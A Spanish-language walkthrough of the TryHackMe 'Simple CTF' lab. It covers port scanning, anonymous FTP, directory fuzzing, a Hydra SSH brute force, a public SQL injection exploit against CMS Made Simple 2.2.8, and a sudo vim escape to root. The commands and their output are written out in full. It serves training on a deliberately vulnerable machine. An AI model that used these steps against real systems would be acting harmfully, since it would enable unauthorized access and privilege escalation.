---
title: Simple CTF TryHackMe
published: true
---

# [](#header-1)Tipo de Maquina

Esta es una maquina para principiantes, de nivel facil, en la que veremos ataques por fuerza bruta, CVE y escalado mediante sudo

1. Reconocimiento
2. Explotacion
3. Escalado de privilegios

# [](#header-2)Arrancar la Maquina

Lo primero que haremos sera arrancar la maquina para ello entraremos a **TryHackme** y le daremos a `Start Machine`

[Easy-CTF-TryHackMe](https://tryhackme.com/room/easyctf)

# [](#header-3)Reconocimiento

Cuando la maquina se haya iniciado iremos a nuestro directorio de trabajo
```shell
cd /home/parrot-hacking/Desktop/TryHackMe/
```
Crearemos un directorio con el nombre de la maquina
```shell
mkdir /home/parrot-hacking/Desktop/TryHackMe/SimpleCTF
```
Ahora con la utilidad `mkt` diseñada por **S4vitar**, crearemos nuestros directorios de trabajo _nmap_, _content_, _exploits_ y _scripts_
```shell
parrot-hacking@home/parrot-hacking/Desktop/TryHackMe/SimpleCTF:~$ mkt
```

## [](#header-3)Nmap

Nos meteremos en el directorio nmap y haremos un escaneado a los puertos abiertos de la maquina
```shell
parrot-hacking@SimpleCTF:~$ nmap -sS --min-rate 5000 --open -vvv -n -Pn -p- simplectf.thm -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-26 14:48 CEST
Initiating SYN Stealth Scan at 14:48
Scanning 10.10.249.50 [65535 ports]
Discovered open port 21/tcp on 10.10.249.50
Discovered open port 80/tcp on 10.10.249.50
Discovered open port 2222/tcp on 10.10.249.50
Completed SYN Stealth Scan at 14:49, 26.39s elapsed (65535 total ports)
Nmap scan report for 10.10.249.50
Host is up, received user-set (0.054s latency).
Scanned at 2021-09-26 14:48:37 CEST for 26s
Not shown: 65532 filtered ports
Reason: 65532 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 63
80/tcp   open  http         syn-ack ttl 63
2222/tcp open  EtherNetIP-1 syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.51 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 22 (968B)
```

Ahora con la utilidad `extractPorts` vamos a extraer los puertos y copiarnoslos en la clipboard
```shell
parrot-hacking@RootMe:~$ extractPorts allPorts

	[*] Extracting information...
 
     		[*] IP Address: 10.10.249.50
     		[*] Open ports: 21,80,2222
 
	[*] Ports copied to clipboard
``` 

Ahora que ya tenemos los puertos copiados en la clipboard, lo que haremos sera poner el siguiente comando para ver que servicio es cada puerto
```shell
parrot-hacking@SimpleCTF:~$ nmap -sC -sV -p21,80,2222 easyctf.thm -oN targeted

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-26 14:52 CEST
Nmap scan report for easyctf.thm (10.10.249.50)
Host is up (0.046s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.3.94
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.19 seconds
```

## [](#header-3)FTP

Vemos que son que el puerto **21** es **FTP**, el puerto **80** es de un servicio **http** y el **2222** es **ssh**
Bueno lo primero que vamos a hacer es ver si el **FTP** tiene acceso como **anonymous**
```shell
parrot-hacking@RootMe:~$ ftp easyctf.thm

Connected to easyctf.thm.
220 (vsFTPd 3.0.3)
Name (easyctf.thm:parrot-hacking): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Vemos que si que esta habilitado, asique vamos a ver que hay dentro 
```shell
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 .
drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 ..
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
```

Vemos que hay un directorio llamado `pub` asique vamos a entrar
```shell
ftp> cd pub
250 Directory successfully changed.
```

Vamos a ver que hay dentro y encontramos un archivo _.txt_, asique lo traemos para nuestra maquina de atacante
```shell
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 .
drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 ..
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> mget *
local: ForMitch.txt remote: ForMitch.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
226 Transfer complete.
166 bytes received in 0.01 secs (22.7650 kB/s)
```

Leemos el archivo **ForMitch.txt** y vemos que nos dice que tiene la misma contraseña en el usuario del sistema y que la ha crackeado en segundos
```shell
parrot-hacking@SimpleCTF:~$ cat ForMitch.txt

Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

## [](#header-4)Web

Vamos a visitar la web y vemos que es una pagina default de Apache
[Web-SimpleCTF](http://easyctf.thm)

![](https://alvar-yoel.github.io/images/SimpleCTF/Apache.PNG)

### [](#header-4)Fuzzing
Ahora tenemos esa pagina web vamos a enumerar sitios web para ello utilizaremos **wfuzz**
```shell
parrot-hacking@SimpleCTF:~$ wfuzz -c -L -t 100 --hc=404 --hh=616 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://easyctf.thm//FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://easyctf.thm//FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                   
=====================================================================

000004567:   200        126 L    1182 W     19833 Ch    "simple"                                                                                  
000095524:   403        11 L     32 W       299 Ch      "server-status"                                                                           

Total time: 0
Processed Requests: 220560
Filtered Requests: 220558
Requests/sec.: 0
```

Ahora iremos a _/simple/_ alli veremos que estamos ante un Simple CMS
[SimpleCMS-TryHackMe](http://easyctf.thm/simple/)

![](https://alvar-yoel.github.io/images/simplectf/CMS.PNG)

# [](#header-4)Explotacion

Hay varias formas de convertirnos en usuario por fuerza bruta o por un CVE

## [](#header-4)Fuerza Bruta al SSH(1º Forma de conseguir el usuario)
Lo que vamos a hacer es con **hydra** atacar por _fuerza bruta_ al _ssh_ y vemos que la contraseña es `secret`
```shell
parrot-hacking@SimpleCTF:~$ hydra -s 2222 -l mitch -P /usr/share/wordlists/rockyou.txt easyctf.thm -t 4 ssh

Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-26 15:13:17
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344401 login tries (l:1/p:14344401), ~3586101 tries per task
[DATA] attacking ssh://easyctf.thm:2222/
[2222][ssh] host: easyctf.thm   login: mitch   password: secret
[STATUS] 14344401.00 tries/min, 14344401 tries in 00:01h, 1 to do in 00:01h, 3 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-26 15:14:45 
```

## [](#header-4)Por CVE en la pagina Web(2º Forma de conseguir el usuario)

Lo primero que haremos sera ver ante que nos estamos enfrentando para ello utilizaremos `whatweb` y vemos que es la version `CMS-Made-Simple[2.2.8]` 
```shell
parrot-hacking@SimpleCTF:~$ whatweb http://easyctf.thm/simple/

http://easyctf.thm/simple/ [200 OK] Apache[2.4.18], CMS-Made-Simple[2.2.8], Cookies[CMSSESSIDd6a5f2400115], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.221.233], JQuery[1.11.1], MetaGenerator[CMS Made Simple - Copyright (C) 2004-2019. All rights reserved.], Script[text/javascript], Title[Home - Pentest it]
```

Ahora vamos a buscar un **exploit** y vemos que hay uno de **SQLi**, lo que hace es probar a partir de unas _letras_, _numeros_ y _caracteres_ y si sale cual es la pagina te lo dice
```shell
parrot-hacking@SimpleCTF:~$ searchsploit CMS Made Simple 2.2.8
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                           |  Path
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                                                                                 | php/webapps/46635.py
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Ahora lo traeremos a nuestra maquina para ello pondremos
```shell
parrot-hacking@SimpleCTF:~$ searchsploit -m php/webapps/46635.py

  Exploit: CMS Made Simple < 2.2.10 - SQL Injection
      URL: https://www.exploit-db.com/exploits/46635
     Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/parrot-hacking/Desktop/TryHackMe/Simple CTF/content/46635.py
```

Ahora miraremos como funciona el script de `python`
```shell
parrot-hacking@SimpleCTF:~$ python 46635.py
[+] Specify an url target
[+] Example usage (no cracking password): exploit.py -u http://target-uri
[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist
[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.
```

Le pondremos en uso y esperaremos a que nos de el `usuario` y la `contraseña`
```shell
parrot-hacking@SimpleCTF:~$ python 46635.py -u http://easyctf.thm/simple/

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

# [](#header-4)Acceso como usuario sin privilegios

Ahora accederemos por ssh al servidor con el usuario `mitch` y la contraseña `secret`
```shell
parrot-hacking@SimpleCTF:~$ ssh mitch@easyctf.thm -p 2222
mitch@easyctf.thm's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ 
```

Ahora nos pondremos en una _bash_
```shell
$ bash
mitch@Machine:~$
```

# [](#header-4)Escalado de Privilegios
Bueno ya tenemos shell como _mitch_ ahora vamos a ver si hay algun privilegio **SUID**
```shell
mitch@Machine:~$ find / -perm -4000 2>/dev/null
/bin/su
/bin/ping
/bin/mount
/bin/umount
/bin/ping6
/bin/fusermount
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/i386-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd
```

Vemos que no hay ninguno vamos intentar hacernos _sudo_ o si tenemos algun privilegio y vemos que podemos ejecutar `vim` como **sudo**
```shell
mitch@Machine:~$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

Ahora iremos a **GFTOBins** para ver si podemos convertirnos en **sudo** y vemos que si
[GFTOBins-Vim](https://gtfobins.github.io/vim/#sudo)
![](https://alvar-yoel.github.io/images/SimpleCTF/Vim.PNG)

Bueno pues vamos a probarlo
```shell
mitch@Machine:~$ mitch@Machine:~$ sudo vim
```

Ahora cuando se nos abra daremos al **ESC** y pondremos `:!/bin/bash`
```shell
~                                                                                                                                                          
~                                                                                                                                                          
~                                                                                                                                                          
~                                                                                                                                                          
~                                                                                                                                                          
~                                                                                                                                                          
~                                                                                                                                                          
~                                                                                                                                                          
~                                                                                                                                                          
~                                                                                                                                                          
~                                                                                                                                                          
~                                                                                                                                                          
~                                                                                                                                                          
~                                                                                                                                                          
~                                                                    VIM - Vi IMproved                                                                     
~                                                                                                                                                          
~                                                                    version 7.4.1689                                                                      
~                                                                by Bram Moolenaar et al.                                                                  
~                                                 Modified by pkg-vim-maintainers@lists.alioth.debian.org                                                  
~                                                       Vim is open source and freely distributable                                                        
~                                                                                                                                                          
~                                                              Help poor children in Uganda!                                                               
~                                                     type  :help iccf<Enter>       for information                                                        
~                                                                                                                                                          
~                                                     type  :q<Enter>               to exit                                                                
~                                                     type  :help<Enter>  or  <F1>  for on-line help                                                       
~                                                     type  :help version7<Enter>   for version info                                                       
~                                                                                                                                                          
~                                                                                                                                                          
~                                                                                                                                                          
~                                                                                                                                                          
~                                                                                                                                                          
~                                                                                                                                                          
~                                                                                                                                                          
~                                                                                                                                                          
~                                                                                                                                                          
~                                                                                                                                                          
~                                                                                                                                                          
~                                                                                                                                                          
~                                                                                                                                                          
~                                                                                                                                                          
:!/bin/bash
```

Ahora ya somos root y ya podremos coger la flag de root
```shell
root@Machine:~# whoami
root
```

